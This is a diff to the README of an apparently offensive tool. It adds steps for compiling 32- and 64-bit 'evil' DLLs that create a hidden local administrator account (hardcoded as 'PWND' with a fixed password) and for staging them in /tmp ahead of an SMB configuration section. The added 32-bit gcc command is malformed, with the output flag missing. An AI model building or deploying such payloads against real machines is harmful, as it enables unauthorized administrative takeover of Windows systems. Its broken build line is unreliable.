@@ -15,20 +15,33 @@ apt install mingw-w64
 ### Build DLL (64 bit)
 I used this version: https://github.com/newsoft/adduser  
 
+You can use the evil32.dll or evil64.dll under ./DLL
+Username: PWND  
+Password: B@dPass123!
+
+Or build your own:  
 ```
 cd DLL  
-mv Tchar.h /usr/x86_64-w64-mingw32/include/
-mv Lmaccess.h /usr/x86_64-w64-mingw32/include/
+cp Tchar.h /usr/x86_64-w64-mingw32/include/
+cp Lmaccess.h /usr/x86_64-w64-mingw32/include/
+cp Tchar.h /usr/i686-w64-mingw32/include
+cp Lmaccess.h /usr/i686-w64-mingw32/include/
 ```
 
 Edit the evil.dll to your needs:  
 - change username & password  
 - change name of the local admin group -> language dependant  
 
-Build the DLL  
+Build the DLL  64 bit:  
 ```
 x86_64-w64-mingw32-gcc -shared -oevil64.dll evil.c -lnetapi32
 cp evil64.dll /tmp/
+```
+
+Build the DLL 32 bit:  
+```
+i686-w64-mingw32-gcc -shared -evil32.dll evil.c -lnetapi32
+cp evil32.dll /tmp/
 ```
 
 ### SMB configuration
